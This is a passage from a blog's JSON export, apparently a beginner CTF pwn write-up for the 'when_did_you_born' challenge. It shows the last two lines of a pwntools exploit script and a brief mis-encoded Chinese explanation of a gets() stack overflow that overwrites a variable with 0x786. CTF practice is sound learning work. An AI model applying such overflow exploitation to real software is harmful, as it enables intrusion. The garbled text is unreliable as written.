class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"æ–°æ‰‹ç»ƒä¹ when_did_you_borngets(&amp;v4)å¤„å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¦†ç›–æ‰v5ï¼Œä¸º1926(0x786)å³å¯ã€‚v4 = rsp+0x0; v5 = rsp + 0x8; æ‰€ä»¥åç§»ä¸º0x81<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]}]}